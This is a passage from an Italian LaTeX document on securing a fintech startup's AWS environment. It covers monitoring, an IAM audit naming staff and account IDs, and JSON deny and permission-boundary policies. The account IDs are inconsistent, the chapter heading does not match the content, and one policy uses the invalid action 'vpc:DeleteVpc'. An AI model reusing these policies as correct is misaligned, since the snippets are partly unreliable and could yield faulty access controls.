            \item \textbf{Audit e Revisione:} È più facile revisionare la configurazione dell'infrastruttura (e quindi la sua postura di sicurezza) analizzando i file di codice piuttosto che navigando nella console AWS.
            \item \textbf{Integrazione con CI/CD:} L'IaC si integra bene nelle pipeline di Continuous Integration/Continuous Deployment per automatizzare anche il provisioning dell'infrastruttura necessaria per le applicazioni.
        \end{itemize}
\end{itemize}
Adottare IaC sin dalle prime fasi aiuta a costruire un'infrastruttura robusta e gestibile nel tempo.

Questo capitolo ha fornito una panoramica delle implementazioni pratiche e delle best practice per costruire e proteggere un'infrastruttura AWS per una startup fintech. Naturalmente, ogni implementazione specifica richiederà ulteriori dettagli e adattamenti in base ai requisiti unici dell'applicazione e del business. I capitoli successivi potrebbero approfondire ulteriormente specifici aspetti come la gestione degli incidenti, i test di penetrazione o l'integrazione di strumenti di terze parti.

\textbf{AWS CloudTrail} è abilitato in tutte le regioni con due trail:
\begin{itemize}
    \item \texttt{finanz-audit-trail}: trail principale per tutte le API calls (ARN: \texttt{arn:aws:cloudtrail:eu-south-1:478291635847:trail/finanz-audit-trail})
    \item \texttt{finanz-security-trail}: trail specifico per eventi di sicurezza con filtri su azioni IAM, EC2, RDS critiche
\end{itemize}
I log sono inviati al bucket \texttt{finanz-cloudtrail-logs-478291635847} con file integrity validation abilitata. Analizziamo circa 15.000-20.000 eventi CloudTrail al giorno in produzione.

\textbf{Amazon CloudWatch} raccoglie metriche da 45+ risorse e gestisce 23 log groups. Gli agent CloudWatch sono installati su tutte le istanze EC2 e inviano metriche ogni 60 secondi. Il costo mensile per CloudWatch è di circa 85-95 EUR.

Abbiamo configurato 28 allarmi CloudWatch, tra cui:
\begin{itemize}
    \item \texttt{HighCPUUtilization-Prod}: CPU > 80\% per 5 minuti su istanze produzione
    \item \texttt{DatabaseConnections-Critical}: Connessioni RDS > 400 (soglia 80\% del massimo)
    \item \texttt{5xxErrors-ALB}: Errori 5xx > 10 in 5 minuti sull'Application Load Balancer  
    \item \texttt{UnauthorizedAPICalls}: Pattern filtro su CloudTrail per chiamate API con AccessDenied
    \item \texttt{RootAccountUsage}: Trigger immediato per qualsiasi utilizzo dell'account root
\end{itemize}
Negli ultimi 30 giorni abbiamo ricevuto 47 notifiche dagli allarmi, di cui 3 classificate come critiche e risolte entro 2 ore.

\begin{itemize}
    \item \textbf{Amazon GuardDuty:} Abilitato nelle regioni eu-south-1, eu-central-1, e eu-west-1. Negli ultimi 90 giorni ha generato 23 findings, principalmente di severity LOW (18) e MEDIUM (5). I finding più comuni sono stati:
        \begin{itemize}
            \item \texttt{Recon:EC2/PortProbeUnprotectedPort}: 8 occorrenze di port scanning
            \item \texttt{UnauthorizedAPICall:IAMUser/InstanceCredentialExfiltration}: 2 tentativi sospetti (investigati e classificati come falsi positivi)
        \end{itemize}
        Il costo mensile per GuardDuty è di circa 12-15 EUR basato sul volume di log analizzati.
    
    \item \textbf{AWS Security Hub:} Centralizza i finding da GuardDuty, Config, Inspector e le nostre custom rules. Attualmente mostra:
        \begin{itemize}
            \item 127 finding total negli ultimi 30 giorni
            \item 89\% classificati come LOW severity
            \item 8\% MEDIUM severity  
            \item 3\% HIGH severity (tutti risolti entro 24 ore)
        \end{itemize}
        Utilizziamo i compliance standard CIS AWS Foundations Benchmark v1.2.0 con compliance score del 87%.
\end{itemize}

Questa è una delle pratiche di sicurezza più importanti che ho implementato nel nostro ambiente. Tutti i nostri application server utilizzano il ruolo IAM \texttt{FinanzEC2AppRole} (ARN: \texttt{arn:aws:iam::478291635847:role/FinanzEC2AppRole}) che permette:
\begin{itemize}
    \item Lettura di oggetti dal bucket S3 \texttt{finanz-static-assets}
    \item Scrittura di log in CloudWatch Logs group \texttt{/aws/ec2/finanz-app}
    \item Accesso a parametri specifici in Systems Manager Parameter Store con prefix \texttt{/finanz/app/}
\end{itemize}
L'applicazione ottiene le credenziali tramite l'endpoint \texttt{http://169.254.169.254/latest/meta-data/iam/security-credentials/FinanzEC2AppRole} che restituisce token temporanei rinnovati automaticamente ogni 6 ore.

Le istanze \textbf{Amazon EC2} sono le macchine virtuali su cui spesso girano le applicazioni. Attualmente gestiamo 8 istanze nell'ambiente di produzione (ID istanze: \texttt{i-0a1b2c3d4e5f67890}, \texttt{i-1b2c3d4e5f678901}, etc.) e 3 in quello di sviluppo. La loro sicurezza è cruciale.

La nostra infrastruttura è gestita tramite \textbf{Terraform} con i file sorgente in un repository Git privato su GitHub. La struttura include:
\begin{itemize}
    \item \textbf{Repository:} \texttt{finanz-infrastructure} con 147 commit negli ultimi 6 mesi
    \item \textbf{Moduli Terraform:} Organizziamo il codice in 8 moduli riutilizzabili (vpc, security-groups, ec2, rds, s3, iam, monitoring, backup)
    \item \textbf{State Management:} Lo stato Terraform è conservato in un bucket S3 \texttt{finanz-terraform-state-478291635847} con DynamoDB table \texttt{terraform-locks} per la gestione dei lock
    \item \textbf{CI/CD Pipeline:} GitHub Actions esegue \texttt{terraform plan} su ogni PR e \texttt{terraform apply} solo dopo approval manuale. Negli ultimi 3 mesi abbiamo eseguito 34 deployment di infrastruttura con 100\% success rate.
    \item \textbf{Benefici Misurati:}
        \begin{itemize}
            \item Riduzione del 90\% degli errori di configurazione rispetto ai deployment manuali
            \item Tempo di provisioning di un nuovo ambiente ridotto da 2 giorni a 45 minuti
            \item Compliance automatica verificata con policy OPA (Open Policy Agent)
        \end{itemize}
\end{itemize}

\chapter{Implementazione di un Honeypot in un'Infrastruttura AWS per Startup Fintech}
\label{chap:honeypot_aws}
\section{Introduzione alla Gestione delle Identità e degli Accessi}
La gestione delle identità e degli accessi (IAM) rappresenta un passo fondamentale per sviluppare qualsiasi strategia di sicurezza robusta in un ambiente cloud come Amazon Web Services (AWS). Per una startup fintech, dove la struttura gerarchica è ancora poco definita, stabilire chi può accedere alle risorse e con quali privilegi non è solo una best practice, ma una necessità imprescindibile per garantire una gestione sicura e affidabile dei dati. Questo capitolo esplora i principi cardine della sicurezza IAM, analizza la configurazione attuale della startup "Finanz" e propone una serie di miglioramenti concreti per rafforzare la postura di sicurezza, ispirandosi ai modelli Zero Trust e al Principio del Minimo Privilegio. L'obiettivo è creare un framework IAM che sia non solo sicuro, ma anche flessibile e gestibile, per supportare la crescita dinamica della startup.

\subsection{Configurazione attuale dell’ambiente AWS di \textit{Finanz}}
\label{subsec:aws_infrastruttura_attuale_cap4}

Prima di entrare nel merito delle tematiche di sicurezza, riepiloghiamo la topologia infrastrutturale attualmente in uso.

L’intera piattaforma opera nella regione \texttt{eu-south-1} (Milano) all’interno di un unico account AWS, ID \texttt{538927841179}. All’interno dell’account convivono i due ambienti logici di riferimento — \texttt{Finanz-Dev} e \texttt{Finanz-Prod} — che vengono isolati a livello di risorse e pipeline di rilascio.

\paragraph{Layer applicativo}
L’applicazione “Finanz-Backend” è gestita da \textbf{AWS Elastic Beanstalk}. Gli ambienti sono:
\begin{itemize}
  \item \texttt{Finanz-Dev} (ID \texttt{e-q9sa4qsmjz});
  \item \texttt{Finanz-Prod} (ID \texttt{e-gueuqgs9nc}).
\end{itemize}
Beanstalk effettua il provisioning di un \textbf{Auto Scaling Group} con istanze \texttt{t3a.small};
l’ambiente di sviluppo mantiene generalmente 1–2 istanze, quello di produzione scala fra 3 e 5 nei picchi. 
Il traffico verso produzione è distribuito da un \textbf{Application Load Balancer} creato automaticamente dallo stack CloudFormation di Beanstalk. 

\paragraph{Layer dati}
I dati transazionali risiedono su \textbf{Amazon RDS for PostgreSQL}:
\begin{description}
  \item[\texttt{finanz-dev-db}] classe \texttt{db.t4g.micro}, Single-AZ, cifrata con KMS; backup disattivati; database logico \texttt{FinanzDevDB}.
  \item[\texttt{finanz-prod-db}] classe \texttt{db.t4g.small}, Multi-AZ abilitato, cifrata con la stessa chiave; retention backup 7 giorni; database logico \texttt{FinanzProdDB}.
\end{description}
Entrambe le istanze utilizzano la chiave  
\texttt{arn:aws:kms:eu-south-1:538927841179:key/3f720caa-19ca-4fa6-bc5c-654617ba5e46}  
e dispongono di 20 GiB di storage \texttt{gp3}.

\paragraph{Networking}
Tutte le risorse sono collocate nella \textbf{VPC} \texttt{Finanz-vpc} (10.0.0.0/16). La suddivisione in subnet prevede:  
\begin{itemize}
  \item \textbf{Pubbliche} 10.0.0.0/20 (AZ a) e 10.0.16.0/20 (AZ b);
  \item \textbf{Private App} 10.0.128.0/20 (AZ a) e 10.0.144.0/20 (AZ b);
  \item \textbf{Private DB} 10.0.32.0/25 (AZ a), 10.0.32.128/25 (AZ b) e 10.0.33.0/25 (AZ c).
\end{itemize}
La VPC è connessa a Internet mediante l’Internet Gateway \texttt{igw-02364236a62913136}. Un endpoint Gateway \texttt{vpce-033d76d7c2fc48ff6} consente traffico privato verso S3.

\paragraph{Storage e CI/CD}
\begin{itemize}
  \item \textbf{Bucket Elastic Beanstalk} \texttt{elasticbeanstalk-eu-south-1-538927841179}: versioni applicative e log.
  \item \textbf{Bucket CodePipeline} \texttt{codepipeline-eu-south-1-538927841179}: artefatti di build; la bucket policy \texttt{SSEAndSSLPolicy} forza cifratura KMS e HTTPS.
\end{itemize}

\paragraph{Automazione e notifiche}
Il ciclo di \textbf{CI/CD} è orchestrato da \textbf{AWS CodePipeline} e \textbf{AWS CodeBuild}; gli eventi di deployment vengono pubblicati su due topic \textbf{SNS} specifici per gli ambienti \texttt{Finanz-Dev} e \texttt{Finanz-Prod}, entrambi privati all’account e senza sottoscrizioni esterne.

\begin{figure}[htbp]
  \centering
  \includegraphics[width=0.8\textwidth]{aws_struttura}
  \caption{Diagramma semplificato dell’architettura AWS di \textit{Finanz}.}
  \label{fig:aws_struttura_attuale_cap2}
\end{figure}


\subsection{Implementazione del Modello Zero Trust e del Principio del Minimo Privilegio}
\label{sec:zero-trust-implementation}

Come già analizzato [\ref{ch:principi-cybersecurity}], il modello \textbf{Zero Trust} rappresenta un superamento del paradigma di sicurezza tradizionale basato sul perimetro. L'adozione di questo principio risulta cruciale nel contesto delle startup, i cui ambienti operativi sono per natura dinamici e flessibili. Le caratteristiche intrinseche delle startup non solo giustificano, ma impongono la necessità di un framework di sicurezza ispirato a tale modello. Approfondiamo ora gli aspetti chiave a sostegno di questa visione:

\begin{itemize}
  \item \textbf{Instabilità relazionale:} Le relazioni professionali nelle startup possono deteriorarsi rapidamente a causa della pressione elevata, degli obiettivi spesso poco definiti e della mancanza di esperienza nella gestione dei conflitti, sia a livello dirigenziale che operativo. Questi fattori creano tensioni che possono sfociare in incomprensioni e scontri personali. Secondo un'analisi di CB Insights, i conflitti interni tra fondatori rappresentano una delle principali cause di fallimento delle startup, incidendo per circa il 13\% dei casi esaminati \cite{CBInsights2023}.
  \item \textbf{Rischio di attacchi interni:} La fragilità dei rapporti interni, unita a dinamiche di potere e insoddisfazioni personali, aumenta la probabilità che ex-collaboratori con accessi privilegiati possano compiere azioni vendicative o dannose. Questo rischio è amplificato dalla scarsa attenzione alle politiche di controllo degli accessi e alla gestione delle risorse umane. Il "2023 Data Breach Investigations Report" di Verizon evidenzia che circa il 20\% delle violazioni di dati coinvolge insider, sottolineando l’importanza di monitorare e limitare gli accessi privilegiati \cite{Verizon2023}.
  \item \textbf{Infrastrutture di sicurezza inadeguate:} Le startup spesso destinano la maggior parte delle risorse allo sviluppo del prodotto e alla crescita del mercato, trascurando gli investimenti in infrastrutture di sicurezza. Inoltre, la mancanza di personale specializzato e di processi consolidati rende difficile implementare misure efficaci. Un rapporto del Ponemon Institute mostra che le piccole organizzazioni hanno una probabilità tre volte maggiore di subire attacchi informatici rispetto alle grandi imprese, proprio a causa di investimenti insufficienti e di una cultura della sicurezza ancora poco sviluppata \cite{Ponemon2023}.
\end{itemize}
Questa sezione illustra come i principi Zero Trust possano essere tradotti in misure di sicurezza concrete all'interno dell'infrastruttura cloud di una startup, con specifico riferimento all'ambiente AWS. Ci concentreremo in particolare sulla gestione delle identità e degli accessi, un pilastro fondamentale per qualsiasi architettura Zero Trust, e sulla sua stretta interconnessione con il \textbf{Principio del Minimo Privilegio (Principle of Least Privilege - PoLP)}.
\subsubsection{Sinergia tra Principio del Minimo Privilegio (PoLP) e Zero Trust}
\label{subsubsec:polp-zerotrust-correlation}

Il Principio del Minimo Privilegio non è solo una buona pratica di sicurezza a sé stante, ma è intrinsecamente legato e \textbf{fondamentale per il successo di un'architettura Zero Trust}. La loro sinergia si manifesta in diversi modi:

\begin{itemize}
    \item \textbf{Riduzione della Superficie d'Attacco:} Limitando strettamente le azioni consentite a ciascuna identità, PoLP riduce l'insieme delle operazioni che un attaccante potrebbe eseguire anche riuscendo a compromettere le credenziali di quell'identità. La verifica dell'identità (Zero Trust) è necessaria ma non sufficiente; i privilegi limitati (PoLP) ne circoscrivono le capacità.
    \item \textbf{Limitazione del Raggio d'Esplosione (\textit{Blast Radius})}: In caso di compromissione o errore, i danni potenziali sono confinati. Un utente o servizio con privilegi minimi non può accedere o modificare risorse al di fuori del suo ambito operativo ristretto, limitando il movimento laterale dell'attaccante e l'impatto dell'incidente.
    \item \textbf{Applicazione della Verifica Esplicita:} Implementare PoLP costringe a definire policy di accesso granulari e intenzionali, basate sulle reali necessità operative. Questo si allinea perfettamente con la richiesta di Zero Trust di basare ogni decisione di accesso su policy esplicite e dinamiche, piuttosto che su autorizzazioni ampie o ereditate implicitamente.
    \item \textbf{Miglioramento del Controllo e dell'Auditabilità:} Policy di accesso minimali e specifiche sono più facili da comprendere, gestire e verificare. Ciò semplifica l'audit della postura di sicurezza e la dimostrazione della conformità, permettendo di attestare che gli accessi sono effettivamente limitati come richiesto dal modello Zero Trust.
\end{itemize}
\subsection{Gestione delle Identità e degli Accessi (IAM) come Pilastro di Zero Trust in AWS}
\label{subsec:iam-zero-trust}

L'infrastruttura ospitata su un Cloud Service Provider (CSP) come AWS è un asset critico per una startup fintech. Essa contiene dati sensibili degli utenti e ospita i servizi essenziali (endpoint API, istanze EC2 per server applicativi, networking VPC, ecc.) che ne garantiscono l'operatività. La protezione di queste risorse inizia dalla gestione rigorosa di chi può accedervi e cosa può fare. \textbf{AWS Identity and Access Management (IAM)} è il servizio centrale per implementare questi controlli e costituisce una base imprescindibile per un modello Zero Trust.

Una delle prime e più critiche aree di intervento riguarda l'\textbf{account root di AWS}. Questo account possiede privilegi illimitati sull'intero ambiente AWS e rappresenta, di conseguenza, un obiettivo di altissimo valore per gli attaccanti e una fonte significativa di rischio operativo se usato impropriamente. Un'implementazione Zero Trust richiede misure stringenti per l'account root:
\begin{itemize}
    \item \textbf{Limitazione Estrema dell'Uso:} L'accesso come utente root deve essere evitato per le operazioni quotidiane e riservato esclusivamente a quelle poche attività che lo richiedono obbligatoriamente (es. modifica delle informazioni di fatturazione, chiusura dell'account, modifica dei piani di supporto).
    \item \textbf{Protezione Robusta delle Credenziali:} La password deve essere estremamente complessa e, soprattutto, l'\textbf{Auten\-ticazione a Più Fattori (MFA)} deve essere \textit{sempre} abilitata e richiesta per l'accesso root.
    \item \textbf{Monitoraggio Continuo:} Ogni azione eseguita tramite l'account root deve essere tracciata e monitorata tramite servizi come AWS CloudTrail, generando allarmi per qualsiasi utilizzo.
\end{itemize}


\subsection{Valutazione dell'implementazione IAM corrente di \emph{Finanz}}
\label{subsec:analisi_iam_finanz}

\subsubsection*{Analisi degli accessi e delle policy}
L'analisi condotta a marzo 2025 sull'infrastruttura di \emph{Finanz} ha permesso di identificare tre identità primarie con privilegi elevati:

\begin{itemize}
    \item \textbf{Andrea Pasini} – opera direttamente con l'account \emph{root} (ARN \texttt{arn:aws:iam::538927841179:root});
    \item \textbf{Andrea Ferraboli} – utente IAM a cui è associata la policy \texttt{AdministratorAccess};
    \item \textbf{Matteo Giuntoni} – utente IAM a cui è associata la policy \texttt{AdministratorAccess}.
\end{itemize}

Si è riscontrato che, nei 90 giorni precedenti l'analisi, l'account \emph{root} è stato utilizzato 76 volte per eseguire attività che potevano essere delegate a ruoli con privilegi limitati, in palese violazione del principio del minimo privilegio.

Inoltre, tutte le policy di autorizzazione assegnate sono di tipo \emph{AWS managed}, ovvero predefinite dal provider. Si rileva la totale assenza di condizioni contestuali (\texttt{Condition}), di controlli basati su attributi (\emph{Attribute-Based Access Control}, ABAC) e di \emph{permission boundary} per circoscrivere i permessi. Ad esempio, l'utente di servizio \texttt{finanz-backend} dispone della policy \texttt{AmazonS3FullAccess}, sebbene le sue mansioni richiedano unicamente l'accesso in sola lettura (\emph{read-only}) a tre specifici bucket di produzione.

\subsubsection*{Criticità rilevate e violazioni delle best practice}
Dall'analisi emergono diverse criticità significative che espongono l'organizzazione a rischi concreti. Tali configurazioni violano direttamente le raccomandazioni definite nelle \emph{AWS Foundational Security Best Practices} \cite{aws_security_foundational}, come dettagliato di seguito:

\begin{enumerate}
    \item \textbf{Protezione e uso improprio dell'account \emph{root}}: L'account principale non è protetto da un dispositivo di \emph{Multi-Factor Authentication} (MFA) di tipo hardware e viene impiegato per attività operative ordinarie. Questa pratica contravviene alla raccomandazione \textbf{IAM-6}, che ne prescrive l'uso esclusivo per attività di emergenza.

    \item \textbf{Privilegi eccessivi per gli utenti amministrativi}: L'assegnazione della policy \texttt{AdministratorAccess} a entrambi gli utenti IAM concede permessi equivalenti a quelli dell'account \emph{root}. Tale configurazione, che consente pieni poteri su tutte le risorse, costituisce una violazione diretta della best practice \textbf{IAM-1}.

    \item \textbf{Autenticazione debole per gli utenti IAM}: Per gli account amministrativi \texttt{Ferraboli} e \texttt{Giuntoni} non è obbligatorio l'uso della MFA per accedere alla console. Questo espone gli account al rischio di compromissione tramite furto di credenziali e viola la raccomandazione \textbf{IAM-5}.

    \item \textbf{Mancanza di una policy per le password}: Non è stata definita una policy che imponga requisiti di complessità, rotazione e lunghezza minima per le password degli utenti. L'assenza di tale politica di sicurezza viola la direttiva \textbf{IAM-7}.
    
    \item \textbf{Assenza di restrizioni a livello di organizzazione}: A livello di AWS Organization non sono state implementate \emph{Service Control Policies} (SCP) restrittive. Il mantenimento della policy predefinita \texttt{FullAWSAccess} non impone alcun \emph{guardrail} preventivo agli account membri, in contrasto con la raccomandazione \textbf{ORG-1}.

    \item \textbf{Gestione delle credenziali non sicura}: Sebbene sia disponibile un'istanza di \emph{Single Sign-On} (SSO) tramite IAM Identity Center, questa non viene utilizzata. L'accesso avviene tramite credenziali IAM statiche e a lungo termine, una pratica obsoleta e rischiosa rispetto all'uso di ruoli con credenziali temporanee.
    
    \item \textbf{Mancanza di account di emergenza (\emph{break-glass})}: Non sono stati predisposti account dedicati e sicuri per garantire l'accesso in scenari critici di \emph{lock-out} amministrativo, lasciando l'organizzazione senza un piano di contingenza affidabile.
\end{enumerate}
\section{Implementazione delle Migliorie Proposte alla Gestione IAM}
\label{sec:implementazione_migliorie_iam}

A partire dalle criticità evidenziate nell'analisi presentata nella Sezione~\ref{subsec:analisi_iam_finanz}, abbiamo progettato e implementato un piano strategico per il rafforzamento della gestione degli accessi e delle identità (IAM) all'interno dell'ambiente AWS di \emph{Finanz}. Gli obiettivi principali di questo intervento consistono nell'applicazione rigorosa del principio del least-privilege (minimo privilegio), nella riduzione del cosiddetto blast radius in caso di compromissione di un'identità e nel pieno soddisfacimento dei nuovi requisiti normativi. Tra questi figurano le direttive AWS previste per il 2025 sull'autenticazione a più fattori (Multi-Factor Authentication, MFA) e gli standard di settore come NIST SP 800-63 e PCI DSS.

\subsection{Ristrutturazione della Gerarchia degli Accessi}
Il primo passo ha riguardato una profonda revisione della gerarchia degli accessi, con un'attenzione particolare all'account \texttt{root} e all'introduzione di meccanismi di controllo preventivo.

\subsubsection{Revisione dell'Account \texttt{root} e delle Policy di Sicurezza}
La gestione dell'account \texttt{root} è stata interamente rivista secondo il principio di utilizzo per la sola emergenza (break-glass only). Per massimizzarne la sicurezza, sono state revocate tutte le access key programmatiche preesistenti e sono stati registrati due dispositivi Multi-Factor Authentication (MFA) hardware conformi allo standard FIDO2 (es. YubiKey 5 C NFC). Tali dispositivi sono custoditi in un luogo fisico sicuro, come una cassetta di sicurezza, e il loro accesso è limitato a figure apicali designate, come il CEO, secondo una procedura formale di emergenza \cite{saraswat:breakglass, clouddefense:mfa}.
Per le attività amministrative ordinarie, è stato invece predisposto un utente IAM dedicato al CTO, \texttt{andrea.pasini.admin}, associato al ruolo \texttt{CTO-AdminRole}. Come descritto nella Sezione \ref{subsubsec:ruoli_specifici_iam}, questo ruolo non possiede privilegi elevati diretti ma delega le operazioni potenzialmente distruttive a ruoli temporanei con permessi specifici, in linea con il principio del privilegio minimo.
A ulteriore protezione degli ambienti critici, è stata implementata una policy di negazione esplicita, \texttt{DenyProdResourceDeletion}, che funge da barriera di sicurezza aggiuntiva. Come mostrato nel Listato~\ref{lst:deny-prod-delete}, la policy impedisce categoricamente la cancellazione di risorse nell'ambiente di produzione (identificate tramite il tag \texttt{Environment=prod}) e la rimozione accidentale o malevola di utenti e ruoli IAM.
\begin{lstlisting}[style=json, caption={Policy IAM per negare eliminazioni in produzione}, label=lst:deny-prod-delete]
  {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "DenyProdTaggableResourceDeletion",
            "Effect": "Deny",
            "Action": [
                "ec2:TerminateInstances",
                "rds:DeleteDBInstance",
                "s3:DeleteBucket",
                "vpc:DeleteVpc"
            ],
            "Resource": "*",
            "Condition": {
                "StringEquals": {
                    "aws:ResourceTag/Environment": "prod"
                }
            }
        },
        {
            "Sid": "DenyCriticalIAMPrincipalDeletion",
            "Effect": "Deny",
            "Action": [
                "iam:DeleteUser",
                "iam:DeleteRole",
                "iam:DeleteRolePolicy",
                "iam:DetachRolePolicy"
            ],
            "Resource": [
                "arn:aws:iam::538927841179:role/CTO-AdminRole",
                "arn:aws:iam::538927841179:role/incident-responder",
                "arn:aws:iam::538927841179:user/andrea.pasini.admin",
                "arn:aws:iam::538927841179:user/matteo.giuntoni",
                "arn:aws:iam::538927841179:user/andrea.ferraboli"
            ]
        }
    ]
}
\end{lstlisting}

\subsubsection{Segmentazione dei Ruoli tramite Permission Boundaries}
Per garantire che i permessi non possano superare una soglia di sicurezza predefinita, abbiamo reso obbligatoria l'applicazione di Permission Boundaries a tutti i nuovi ruoli IAM. Un permission boundary definisce il perimetro massimo di autorizzazioni che un'entità può possedere, anche se la sua policy di identità ne concedesse di più. Il Listato \ref{lst:permission-boundary-dev} illustra un esempio di tale confine, \texttt{FinanzDeveloperBoundary}, che limita le azioni degli sviluppatori ai servizi necessari (EC2, S3, RDS), impedendo al contempo qualsiasi operazione su risorse di produzione e negando esplicitamente l'accesso ai servizi di gestione IAM e AWS Organizations. L'applicazione di questi confini è stata automatizzata tramite una funzione Lambda, \texttt{enforce-boundaries-lambda}, che viene attivata dagli eventi \texttt{CreateRole} e \texttt{PutRolePolicy} registrati da AWS CloudTrail.
\begin{lstlisting}[style=json, caption={Esempio di \texttt{FinanzDeveloperBoundary}}, label=lst:permission-boundary-dev]
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowDevServicesAndActions",
      "Effect": "Allow",
      "Action": [
        "ec2:Describe*",
        "ec2:RunInstances", 
        "ec2:StartInstances",
        "ec2:StopInstances",
        "ec2:TerminateInstances",
        "s3:ListBucket",
        "s3:GetObject",
        "s3:PutObject", 
        "rds:Describe*",
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEqualsIfExists": { "aws:ResourceTag/Environment": "prod" } 
      }
    },
    {
       "Sid": "DenyIAMModificationAndProdAccess",
       "Effect": "Deny",
       "Action": [
          "iam:*", 
          "organizations:*",
          "ec2:TerminateInstances", 
          "rds:DeleteDBInstance" 
        ],
        "Resource": "*",
        "Condition": {
           "StringEqualsIfExists": { "aws:ResourceTag/Environment": "prod" } 
        }
    },
    {
       "Sid": "DenyIAMModificationOutsideBoundary",
       "Effect": "Deny",
       "Action": [
          "iam:AttachUserPolicy",
          "iam:AttachRolePolicy",
          "iam:PutUserPolicy",
          "iam:PutRolePolicy",
          "iam:CreatePolicy",
          "iam:CreatePolicyVersion",
          "iam:SetDefaultPolicyVersion",
          "iam:DeletePolicy",
          "iam:DeletePolicyVersion",
          "iam:DetachUserPolicy",
          "iam:DetachRolePolicy",
          "iam:DeletePermissionsBoundary" 
        ],
        "Resource": "*",
        "Condition": {
           "StringNotLike": {
              "iam:PermissionsBoundary": "arn:aws:iam::538927841179:policy/FinanzDeveloperBoundary" 
           }
        }
    }
  ]
}
\end{lstlisting}

\subsection{Sviluppo di un Modello Ibrido Aggiornato per la Gestione degli Accessi}
\label{subsec:modello_ibrido_aggiornato_iam}
Per rispondere alle esigenze di una startup fintech come Finanz, che richiede agilità e, al contempo, un elevato livello di sicurezza, in questa sezione si propone un modello ibrido di \emph{Identity and Access Management} (IAM). Questo approccio si articola su \emph{tre gruppi baseline}—\texttt{dev}, \texttt{backend-dev} e \texttt{admin}—ai quali vengono assegnati i permessi necessari per le attività ordinarie. A questi si affiancano \emph{quattro ruoli operativi circoscritti}, assumibili \emph{on-demand} tramite il servizio AWS STS (Security Token Service), che richiedono sistematicamente l'autenticazione a più fattori (MFA).

L'architettura è concepita per ridurre il cosiddetto \emph{blast-radius} (raggio d'esplosione) in caso di compromissione delle credenziali e per agevolare gli audit di conformità (come PCI DSS o SOC-2). Il modello si allinea infatti ai principi di \emph{least privilege} (minimo privilegio) e \emph{zero-trust}, come delineato da standard e best practice di settore \cite{NIST_ZTA,NIST_SP80063,PCI_DSS,DatadogLeastPrivilege}.

\subsubsection{Gruppi baseline}
\label{subsubsec:gruppi_base_iam}

\paragraph{\texttt{dev}}
Questo gruppo è destinato agli sviluppatori front-end e full-stack.
\begin{itemize}
  \item \textbf{EC2}: È concesso il permesso di avviare, interrompere e terminare \emph{esclusivamente} le istanze EC2 cui è associato il tag \texttt{Environment=dev}. Non sono concessi diritti sulle istanze di produzione \cite{AWSEC2IAM}.
  \item \textbf{Elastic Beanstalk}: Viene garantita la facoltà di eseguire deploy (ad esempio, tramite il comando \texttt{eb deploy}) negli ambienti di sviluppo, identificati dal tag \texttt{dev}. Tale autorizzazione può essere implementata utilizzando la policy gestita \texttt{AWSElasticBeanstalkFullAccess}, rigorosamente vincolata da una clausola \texttt{Condition} basata sul tag \texttt{aws:ResourceTag/Environment=dev} \cite{AWSEBRole}.
  \item \textbf{S3}: Sono concessi permessi di lettura e scrittura nei bucket S3 designati per lo sviluppo (ad esempio, bucket con suffisso \texttt{-dev} o tag specifici), mentre l'accesso ai bucket di produzione è esplicitamente negato \cite{AWSS3Security}.
  \item \textbf{Load Balancer}: È prevista la possibilità di descrivere (API \texttt{Describe*}) i load balancer associati agli ambienti di sviluppo, ma senza alcuna facoltà di modifica \cite{AWSELBIAM}.
  \item \textbf{RDS}: Viene fornito un accesso di tipo \emph{data-reader} (sola lettura dei dati) sui cluster Aurora/RDS di sviluppo. Le operazioni modificative, come \texttt{ModifyDBInstance} o \texttt{DeleteDBInstance}, devono essere proibite \cite{AWSRDSIAM}.
\end{itemize}

\paragraph{\texttt{backend-dev}}
Questo gruppo è concepito per gli sviluppatori back-end con responsabilità specifiche sull'integrazione dei dati.
\begin{itemize}
  \item Oltre a ereditare tutti i permessi del gruppo \texttt{dev}, dispone delle seguenti autorizzazioni aggiuntive.
  \item \textbf{RDS}: Sono aggiunti i permessi di \emph{data-writer} (scrittura dati) sui database di sviluppo. Per l'accesso ai database di produzione (ad esempio, tramite \texttt{QueryEditor}), si raccomanda di concedere il permesso \texttt{rds-db:connect} condizionandolo tramite tag di richiesta (\texttt{aws:RequestTag/ChangeId}), il che implica un processo di approvazione formale per modifiche o query dirette.
  \item \textbf{SQS/SNS}: È garantita la capacità di gestire code (SQS) e topic (SNS) negli ambienti non di produzione, funzionalità essenziale per le pipeline di dati event-driven.
  \item \textbf{Secrets Manager}: È concesso il permesso di leggere segreti il cui ambito è limitato all'ambiente di sviluppo, ad esempio tramite l'uso di tag specifici associati al segreto \cite{AWSIAMBestPractices}.
\end{itemize}

\paragraph{\texttt{admin}}
Gruppo riservato ai Cloud Engineer o al personale DevOps responsabile del controllo e della manutenzione continua dell'infrastruttura.
\begin{itemize}
  \item \textbf{EC2 e Auto Scaling}: Dispone della piena gestione delle istanze e dei gruppi di auto-scaling, ad eccezione di azioni altamente distruttive come l'eliminazione di VPC di produzione, che dovrebbero essere impedite da Service Control Policies (SCP) o da un \emph{permission boundary}.
  \item \textbf{S3}: Ha la facoltà di modificare le \emph{lifecycle rules} dei bucket e le policy di replica cross-region, operazioni essenziali per le strategie di backup e disaster recovery.
  \item \textbf{Elastic Load Balancing}: Può creare e aggiornare listener e target group in tutti gli ambienti, previa validazione formale per le modifiche in produzione.
  \item \textbf{RDS}: Può eseguire operazioni di manutenzione come il patching, la creazione di snapshot e la gestione del \emph{failover} dei database.
  \item \textbf{IAM}: La capacità di creare o aggiornare policy IAM deve essere strettamente confinata da un \emph{permissions-boundary} globale. Tale boundary deve impedire azioni critiche come \texttt{iam:DeleteRolePolicy} su ruoli sensibili, \texttt{organizations:DeleteOrganization} o la modifica del boundary stesso \cite{AWSPermBoundaries}.
\end{itemize}

\subsubsection{Ruoli Operativi Specifici (Assumibili On-Demand)}
\label{subsubsec:ruoli_specifici_iam}
Questi ruoli sono concepiti per un'assunzione temporanea e strettamente necessaria, con una durata della sessione limitata (ad esempio, 1 ora) e con l'obbligo di MFA per l'attivazione. Si raccomanda che i log di CloudTrail relativi all'assunzione e all'utilizzo di tali ruoli siano archiviati in un bucket S3 immutabile, possibilmente con replica cross-region per una maggiore resilienza.

\begin{itemize}
